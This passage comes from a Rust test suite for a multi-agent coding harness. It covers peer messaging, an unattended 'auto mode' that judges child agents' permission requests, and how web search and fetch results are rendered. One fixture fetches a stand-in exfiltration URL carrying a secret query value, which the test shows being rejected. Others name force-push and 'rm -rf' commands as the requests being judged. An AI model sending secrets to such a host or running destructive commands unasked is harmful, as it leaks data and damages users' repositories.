    use super::peer_tools::roster_system_text;

    let mut peers = PeerSet::default();
    assert!(roster_system_text(&peers).is_none(), "peerless → no block");

    let (a_ctrl, _a_ev, _a_ui) = fake_peer();
    peers.register(supervised_reg(a_ctrl, agent_who("child-1")));
    let (b_ctrl, _b_ev, _b_ui) = fake_peer();
    peers.register(PeerRegistration::new(b_ctrl, agent_who("mate")));

    let text = roster_system_text(&peers).expect("held peers → a block");
    assert!(text.contains("MessagePeer"), "names the tool: {text}");
    assert!(
        text.contains("child-1 (subagent you spawned)"),
        "supervised peer labelled: {text}"
    );
    assert!(
        text.contains("mate (peer)"),
        "unsupervised peer labelled: {text}"
    );
}

// Both messages are queued before the loop spawns, so the coalescing drain is deterministic.
#[tokio::test]
async fn consecutive_same_sender_messages_coalesce_into_one_turn() {
    let (session, dir) = mk_session();
    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);

    let who = agent_who("child-1");
    ui_tx
        .send((
            Some(who.clone()),
            UiEvent::UserMessage { text: "one".into() },
        ))
        .await
        .unwrap();
    ui_tx
        .send((Some(who), UiEvent::UserMessage { text: "two".into() }))
        .await
        .unwrap();

    let task = tokio::spawn(run_agent(
        mk_cfg(),
        RecordingProvider { seen: seen.clone() },
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));

    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            break;
        }
    }

    let transcript = seen.lock().unwrap().clone();
    assert_eq!(
        transcript.len(),
        1,
        "coalesced into one turn (a single user message), not two: {transcript:?}"
    );
    match &transcript[0].content[0] {
        ContentBlock::Text { text } => {
            assert!(
                text.contains("one") && text.contains("two"),
                "both messages reach the model in one turn: {text}"
            );
            assert!(
                text.starts_with("[message from peer child-1]"),
                "attributed once, to the shared sender: {text}"
            );
        }
        other => panic!("expected a coalesced user turn, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn different_sender_messages_are_not_coalesced() {
    let (session, dir) = mk_session();
    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);

    ui_tx
        .send((
            Some(agent_who("alice")),
            UiEvent::UserMessage {
                text: "from-a".into(),
            },
        ))
        .await
        .unwrap();
    ui_tx
        .send((
            Some(agent_who("bob")),
            UiEvent::UserMessage {
                text: "from-b".into(),
            },
        ))
        .await
        .unwrap();

    let task = tokio::spawn(run_agent(
        mk_cfg(),
        RecordingProvider { seen: seen.clone() },
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));

    let mut completed = 0;
    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            completed += 1;
            if completed == 2 {
                break;
            }
        }
    }

    let transcript = seen.lock().unwrap().clone();
    let user_texts: Vec<&str> = transcript
        .iter()
        .filter(|m| m.role == "user")
        .filter_map(|m| match &m.content[0] {
            ContentBlock::Text { text } => Some(text.as_str()),
            _ => None,
        })
        .collect();
    assert!(
        user_texts.iter().any(|t| t.contains("from-a"))
            && user_texts.iter().any(|t| t.contains("from-b")),
        "each sender is its own turn: {user_texts:?}"
    );
    assert!(
        user_texts
            .iter()
            .all(|t| !(t.contains("from-a") && t.contains("from-b"))),
        "the two senders' messages are never merged into one turn: {user_texts:?}"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// The peer's Error is always narrated and events are processed in order, so it is a
// sentinel: had the AssistantText narrated, its Notice would arrive first.
#[tokio::test]
async fn unsupervised_peer_activity_is_not_narrated() {
    let (session, dir) = mk_session();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let (reg_tx, reg_rx) = mpsc::unbounded_channel();
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), Some(reg_rx)),
    ));

    let (peer_ctrl, peer_ev, _peer_ui) = fake_peer();
    reg_tx
        .send(PeerRegistration::new(peer_ctrl, agent_who("mate")))
        .unwrap();
    peer_ev
        .send(ControllerEvent::AssistantText {
            text: "chatty peer output".into(),
        })
        .unwrap();
    peer_ev
        .send(ControllerEvent::Error {
            message: "sentinel".into(),
        })
        .unwrap();

    let mut first_activity_notice = None;
    while let Some(ev) = agent_rx.recv().await {
        if let AgentEvent::Notice { text } = ev {
            if text.contains("connected to peer") {
                continue;
            }
            first_activity_notice = Some(text);
            break;
        }
    }
    let text = first_activity_notice.expect("expected the sentinel error Notice");
    assert!(
        text.contains("sentinel"),
        "the first narrated notice must be the error sentinel, not the suppressed \
         activity: {text}"
    );
    assert!(
        !text.contains("chatty peer output"),
        "unsupervised activity must not narrate: {text}"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn second_connected_human_makes_messages_attributed() {
    use crate::core::PeerWiring;

    let (session, dir) = mk_session();
    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let host = SessionHost::spawn(
        mk_cfg(),
        RecordingProvider { seen: seen.clone() },
        FakeBackend,
        session,
        Vec::new(),
        Vec::new(),
        PeerWiring::default(),
    );

    let alice = host
        .attach(ClientIdentity::human("alice"))
        .await
        .expect("alice attaches");
    let mut bob = host
        .attach(ClientIdentity::human("bob"))
        .await
        .expect("bob attaches");

    bob.ui_tx
        .send(UiEvent::UserMessage { text: "hi".into() })
        .await
        .unwrap();
    let done = tokio::time::timeout(std::time::Duration::from_secs(5), async {
        loop {
            match bob.events.recv().await {
                Some(ControllerEvent::TurnComplete) => break true,
                Some(_) => continue,
                None => break false,
            }
        }
    })
    .await
    .expect("timed out waiting for the turn");
    assert!(done);

    let transcript = seen.lock().unwrap().clone();
    match &transcript[0].content[0] {
        ContentBlock::Text { text } => assert_eq!(text, "[message from bob]\nhi"),
        other => panic!("expected bob's attributed turn, got {other:?}"),
    }

    drop(alice);
    host.shutdown().await.unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// Without the report, a maxed-out child stalls until a human notices.
#[tokio::test]
async fn maxed_out_turn_reports_up_the_spawner_edge() {
    let (session, dir) = mk_session();
    let provider = ScriptedProvider {
        // tool_use on every call, so the turn never ends before the budget does.
        responses: std::sync::Mutex::new(vec![
            tool_use_response("FakeTool", serde_json::json!({})),
            tool_use_response("FakeTool", serde_json::json!({})),
        ]),
        seen_messages: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
        seen_tools: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
    };
    let mut cfg = mk_cfg();
    cfg.max_iterations = 2;

    let mut peers = PeerSet::default();
    let (peer_ctrl, _peer_ev, mut peer_ui) = fake_peer();
    let mut reg = PeerRegistration::new(peer_ctrl, agent_who("parent-1"));
    reg.spawner = true;
    peers.register(reg);

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, _agent_rx) = mpsc::channel(64);
    let task = tokio::spawn(run_agent(
        cfg,
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();

    match peer_ui.recv().await {
        Some(UiEvent::UserMessage { text }) => {
            assert!(text.contains("iteration limit (2)"), "{text}");
        }
        other => panic!("expected the limit report driven up the spawner edge, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

async fn send_command(ui_tx: &mpsc::Sender<LoopInput>, line: &str) {
    ui_tx
        .send((None, UiEvent::Command { line: line.into() }))
        .await
        .unwrap();
}

async fn expect_notice(agent_rx: &mut mpsc::Receiver<AgentEvent>, needle: &str) {
    match agent_rx.recv().await {
        Some(AgentEvent::Notice { text }) => assert!(text.contains(needle), "{text}"),
        other => panic!("expected a Notice containing {needle:?}, got {other:?}"),
    }
}

// The steering turn must carry the auto block too: that is where the check-in policy
// is applied.
#[tokio::test]
async fn auto_mode_spawns_unprompted_and_steers_under_the_policy() {
    let (session, dir) = mk_session();
    let seen_system = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = SystemLogProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("Spawn", serde_json::json!({"task": "fix the bug"})),
            end_turn_response("delegated"),
            tool_use_response("RespondToPeer", serde_json::json!({"verdict": "approve"})),
            end_turn_response("ok"),
        ]),
        seen_system: seen_system.clone(),
    };

    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    let slot = std::sync::Arc::new(std::sync::Mutex::new(Some(peer_ctrl)));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        AgentIo {
            ui_rx,
            agent_tx,
            peers: PeerSet::default(),
            peer_register_rx: None,
            peer_factory: Some(stub_factory(slot.clone())),
            peer_dialer: None,
            self_handle: crate::core::host::spawn_bare_broker(Vec::new()).handle,
            multi_driver: std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false)),
        },
    ));

    send_command(&ui_tx, "/auto").await;
    expect_notice(&mut agent_rx, "auto mode on").await;

    ui_tx
        .send((
            None,
            UiEvent::UserMessage {
                text: "fix the bug".into(),
            },
        ))
        .await
        .unwrap();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest { tool_name, .. }) => {
                panic!("auto mode must not prompt for {tool_name}")
            }
            Some(AgentEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("loop ended early"),
        }
    }
    assert!(slot.lock().unwrap().is_none(), "the factory ran");

    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "cargo test".into(),
        })
        .unwrap();
    match peer_ui.recv().await {
        Some(UiEvent::PermissionResponse { allow, .. }) => assert!(allow),
        other => panic!("expected the approve routed to the child, got {other:?}"),
    }

    let requests = seen_system.lock().unwrap().clone();
    assert_eq!(
        requests.len(),
        3,
        "spawn turn, its close, the steering turn"
    );
    for system in &requests {
        assert!(
            system.iter().any(|t| t.contains("Auto mode is on")),
            "every request carries the auto block: {system:?}"
        );
    }

    // The steering turn's closing Notice may still be queued ahead of the toggle's.
    send_command(&ui_tx, "/auto").await;
    drain_until(
        &mut agent_rx,
        |ev| matches!(ev, AgentEvent::Notice { text } if text == "auto mode off"),
    )
    .await;
    ui_tx
        .send((
            None,
            UiEvent::UserMessage {
                text: "thanks".into(),
            },
        ))
        .await
        .unwrap();
    drain_until(&mut agent_rx, |ev| matches!(ev, AgentEvent::TurnComplete)).await;
    let last = seen_system.lock().unwrap().last().unwrap().clone();
    assert!(
        !last.iter().any(|t| t.contains("Auto mode is on")),
        "toggling off drops the block: {last:?}"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn auto_mode_is_unavailable_without_a_spawn_factory() {
    let (session, dir) = mk_session();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));

    send_command(&ui_tx, "/auto").await;
    expect_notice(&mut agent_rx, "not available").await;

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// /auto needs a spawn factory; this one's slot is empty, so calling it would panic.
fn auto_io(
    ui_rx: mpsc::Receiver<LoopInput>,
    agent_tx: mpsc::Sender<AgentEvent>,
    peers: PeerSet,
) -> AgentIo {
    AgentIo {
        peer_factory: Some(stub_factory(std::sync::Arc::new(std::sync::Mutex::new(
            None,
        )))),
        ..mk_io(ui_rx, agent_tx, peers, None)
    }
}

// Headers flip their badge without waiting for the next turn boundary.
#[tokio::test]
async fn auto_toggle_emits_session_info() {
    let (session, dir) = mk_session();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        auto_io(ui_rx, agent_tx, PeerSet::default()),
    ));

    send_command(&ui_tx, "/auto").await;
    drain_until(&mut agent_rx, |ev| {
        matches!(ev, AgentEvent::SessionInfo { auto: true, .. })
    })
    .await;
    send_command(&ui_tx, "/auto").await;
    drain_until(&mut agent_rx, |ev| {
        matches!(ev, AgentEvent::SessionInfo { auto: false, .. })
    })
    .await;

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// The gated tool comes back as an error (not a denial), so the loop carries on instead
// of parking for guidance.
#[tokio::test]
async fn auto_mode_never_prompts_the_human() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("GatedTool", serde_json::json!({})),
            tool_use_response("DismissPeer", serde_json::json!({"peer": "child-1"})),
            end_turn_response("delegating instead"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools,
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, _peer_ev, _peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        auto_io(ui_rx, agent_tx, peers),
    ));

    send_command(&ui_tx, "/auto").await;
    expect_notice(&mut agent_rx, "auto mode on").await;
    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest { tool_name, .. }) => {
                panic!("auto mode must not prompt for {tool_name}")
            }
            Some(AgentEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("loop ended early"),
        }
    }

    let results: Vec<(String, bool)> = seen_messages
        .lock()
        .unwrap()
        .iter()
        .flat_map(|m| m.content.clone())
        .filter_map(|b| match b {
            ContentBlock::ToolResult {
                content, is_error, ..
            } => Some((content, is_error)),
            _ => None,
        })
        .collect();
    assert_eq!(results.len(), 2, "{results:?}");
    assert!(
        results[0].1 && results[0].0.contains("Auto mode is on"),
        "the gated tool is refused with a delegate reminder: {results:?}"
    );
    assert!(
        !results[1].1 && results[1].0.contains("dismissed child-1"),
        "DismissPeer ran ungated: {results:?}"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// A denied child otherwise waits for guidance forever.
#[tokio::test]
async fn auto_mode_deny_without_message_tells_the_child_to_skip_and_report() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![tool_use_response(
            "RespondToPeer",
            serde_json::json!({"verdict": "deny"}),
        )]),
        seen_messages,
        seen_tools,
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        auto_io(ui_rx, agent_tx, peers),
    ));

    send_command(&ui_tx, "/auto").await;
    expect_notice(&mut agent_rx, "auto mode on").await;
    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "$ git push --force".into(),
        })
        .unwrap();

    match peer_ui.recv().await {
        Some(UiEvent::PermissionResponse { allow, .. }) => assert!(!allow),
        other => panic!("expected the deny routed to the child, got {other:?}"),
    }
    match peer_ui.recv().await {
        Some(UiEvent::UserMessage { text }) => assert!(text.contains("Needs you"), "{text}"),
        other => panic!("expected the skip-and-report message, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// In auto mode escalate is not a verdict, so two escalates leave the check-in unjudged.
#[tokio::test]
async fn auto_mode_unjudged_check_in_is_skipped_not_escalated() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let escalate =
        || tool_use_response("RespondToPeer", serde_json::json!({"verdict": "escalate"}));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![escalate(), escalate()]),
        seen_messages,
        seen_tools,
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        auto_io(ui_rx, agent_tx, peers),
    ));

    send_command(&ui_tx, "/auto").await;
    expect_notice(&mut agent_rx, "auto mode on").await;
    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "$ rm -rf build".into(),
        })
        .unwrap();

    match peer_ui.recv().await {
        Some(UiEvent::PermissionResponse { tool_use_id, allow }) => {
            assert_eq!(tool_use_id, "t1");
            assert!(!allow);
        }
        other => panic!("expected the deny routed to the child, got {other:?}"),
    }
    match peer_ui.recv().await {
        Some(UiEvent::UserMessage { text }) => {
            assert!(
                text.contains("could not judge") && text.contains("Needs you"),
                "{text}"
            )
        }
        other => panic!("expected the skip-and-report message, got {other:?}"),
    }
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest { .. }) => panic!("auto mode must not escalate"),
            Some(AgentEvent::Notice { text }) if text.contains("told it to skip") => break,
            Some(_) => {}
            None => panic!("expected the skip Notice"),
        }
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn auto_mode_respond_to_peer_offers_no_escalate() {
    let mut peers = PeerSet::default();
    let (peer_ctrl, _peer_ev, _peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));
    let verdicts = |auto| {
        super::peer_tools::schemas(&peers, &None, auto)
            .into_iter()
            .find(|s| s["name"] == "RespondToPeer")
            .unwrap()["input_schema"]["properties"]["verdict"]["enum"]
            .clone()
    };
    assert_eq!(verdicts(true), serde_json::json!(["approve", "deny"]));
    assert_eq!(
        verdicts(false),
        serde_json::json!(["approve", "deny", "escalate"])
    );
}

#[tokio::test]
async fn auto_mode_survives_resume() {
    let (session, dir) = mk_session();
    let id = session.id.clone();

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        auto_io(ui_rx, agent_tx, PeerSet::default()),
    ));
    send_command(&ui_tx, "/auto").await;
    expect_notice(&mut agent_rx, "auto mode on").await;
    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();

    let store = SessionStore::open(&dir.join("nudge.db")).unwrap();
    assert!(store.auto(&id).unwrap(), "the toggle is saved");
    let resumed = Session::open(&id, dir.clone(), store).unwrap();

    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("GatedTool", serde_json::json!({})),
            end_turn_response("delegating"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        resumed.session,
        Vec::new(),
        auto_io(ui_rx, agent_tx, PeerSet::default()),
    ));
    expect_notice(&mut agent_rx, "restored").await;
    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest { tool_name, .. }) => {
                panic!("a resumed auto session must not prompt for {tool_name}")
            }
            Some(AgentEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("loop ended early"),
        }
    }
    let refused = seen_messages.lock().unwrap().iter().any(|m| {
        m.content.iter().any(|b| {
            matches!(b, ContentBlock::ToolResult { content, is_error: true, .. }
                if content.starts_with("Auto mode is on"))
        })
    });
    assert!(refused, "the restored mode is in effect");

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

fn web_search_blocks(id: &str, content: Value) -> Vec<ContentBlock> {
    vec![
        ContentBlock::ServerToolUse {
            id: id.into(),
            name: "web_search".into(),
            input: serde_json::json!({"query": "latest tokio"}),
            extra: Default::default(),
        },
        ContentBlock::WebSearchToolResult {
            tool_use_id: id.into(),
            content,
            extra: Default::default(),
        },
    ]
}

fn web_search_hits() -> Value {
    serde_json::json!([{"type": "web_search_result", "url": "https://tokio.rs",
                        "title": "Tokio", "encrypted_content": "x"}])
}

// pause_turn means a server-side tool hit the API's own loop limit; the partial turn is
// sent straight back with no user message in between.
#[tokio::test]
async fn pause_turn_resumes_without_a_new_user_message() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            Response {
                content: web_search_blocks("srv1", web_search_hits()),
                stop_reason: "pause_turn".into(),
                usage: Usage::default(),
                container_id: None,
                warning: None,
                context_cleared: None,
            },
            end_turn_response("done"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(64);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));
    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            break;
        }
    }

    let transcript = seen_messages.lock().unwrap().clone();
    let roles: Vec<&str> = transcript.iter().map(|m| m.role.as_str()).collect();
    assert_eq!(roles, ["user", "assistant"], "{transcript:?}");
    assert!(
        matches!(
            &transcript[1].content[..],
            [
                ContentBlock::ServerToolUse { .. },
                ContentBlock::WebSearchToolResult { .. }
            ]
        ),
        "{transcript:?}"
    );

    // A third model call would panic the scripted provider and fail the join below.
    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    let mut extra_completes = 0;
    while let Ok(ev) = agent_rx.try_recv() {
        if matches!(ev, AgentEvent::TurnComplete) {
            extra_completes += 1;
        }
    }
    assert_eq!(extra_completes, 0, "the paused turn completes exactly once");
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn server_tool_blocks_render_as_tool_events_without_dispatch() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let mut content = web_search_blocks("srv1", web_search_hits());
    content.extend(web_search_blocks(
        "srv2",
        serde_json::json!({"type": "web_search_tool_result_error", "error_code": "max_uses_exceeded"}),
    ));
    content.push(ContentBlock::ToolUse {
        id: "tu1".into(),
        name: "Read".into(),
        input: serde_json::json!({}),
    });
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            Response {
                content,
                stop_reason: "tool_use".into(),
                usage: Usage::default(),
                container_id: None,
                warning: None,
                context_cleared: None,
            },
            end_turn_response("done"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(64);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));
    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    let mut tool_events = Vec::new();
    while let Some(ev) = agent_rx.recv().await {
        match ev {
            AgentEvent::ToolUseStart { id, name, summary } => {
                tool_events.push(format!("start {id} {name} {summary}"))
            }
            AgentEvent::ToolResult {
                id,
                content,
                is_error,
            } => tool_events.push(format!("result {id} {is_error} {content}")),
            AgentEvent::TurnComplete => break,
            _ => {}
        }
    }
    assert_eq!(
        tool_events,
        [
            "start srv1 WebSearch latest tokio",
            "result srv1 false Tokio — https://tokio.rs",
            "start srv2 WebSearch latest tokio",
            "result srv2 true web search error: max_uses_exceeded",
            "start tu1 Read ",
            "result tu1 false ",
        ]
    );

    let transcript = seen_messages.lock().unwrap().clone();
    match &transcript[2].content[..] {
        [ContentBlock::ToolResult { tool_use_id, .. }] => assert_eq!(tool_use_id, "tu1"),
        other => panic!("expected only the client tool's result, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

fn web_fetch_blocks(id: &str, url: &str, content: Value) -> Vec<ContentBlock> {
    vec![
        ContentBlock::ServerToolUse {
            id: id.into(),
            name: "web_fetch".into(),
            input: serde_json::json!({"url": url}),
            extra: Default::default(),
        },
        ContentBlock::WebFetchToolResult {
            tool_use_id: id.into(),
            content,
            extra: Default::default(),
        },
    ]
}

// A fetch card shows a summary, never the page body.
#[tokio::test]
async fn web_fetch_blocks_render_as_tool_events_without_dispatch() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let mut content = vec![ContentBlock::Text {
        text: "Reading it.".into(),
    }];
    content.extend(web_fetch_blocks(
        "srvf1",
        "https://tokio.rs/blog",
        serde_json::json!({"type": "web_fetch_result", "url": "https://tokio.rs/blog",
                           "content": {"type": "document",
                                       "source": {"type": "text", "media_type": "text/plain",
                                                  "data": "a".repeat(12_400)}}}),
    ));
    content.push(ContentBlock::Text {
        text: "And the file link:".into(),
    });
    content.extend(web_fetch_blocks(
        "srvf2",
        "https://evil.example/?k=secret",
        serde_json::json!({"type": "web_fetch_tool_result_error", "error_code": "url_not_in_prior_context"}),
    ));
    content.push(ContentBlock::ToolUse {
        id: "tu1".into(),
        name: "Read".into(),
        input: serde_json::json!({}),
    });
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            Response {
                content,
                stop_reason: "tool_use".into(),
                usage: Usage::default(),
                container_id: None,
                warning: None,
                context_cleared: None,
            },
            end_turn_response("done"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(64);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));
    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    let mut events = Vec::new();
    while let Some(ev) = agent_rx.recv().await {
        match ev {
            AgentEvent::AssistantText { text } => events.push(format!("text {text}")),
            AgentEvent::ToolUseStart { id, name, summary } => {
                events.push(format!("start {id} {name} {summary}"))
            }
            AgentEvent::ToolResult {
                id,
                content,
                is_error,
            } => events.push(format!("result {id} {is_error} {content}")),
            AgentEvent::TurnComplete => break,
            _ => {}
        }
    }
    assert_eq!(
        events,
        [
            "text Reading it.",
            "start srvf1 WebFetch https://tokio.rs/blog",
            "result srvf1 false fetched https://tokio.rs/blog (text, 12.4k chars)",
            "text And the file link:",
            "start srvf2 WebFetch https://evil.example/?k=secret",
            "result srvf2 true web fetch error: url_not_in_prior_context",
            "start tu1 Read ",
            "result tu1 false ",
            "text done",
        ]
    );

    let transcript = seen_messages.lock().unwrap().clone();
    match &transcript[2].content[..] {
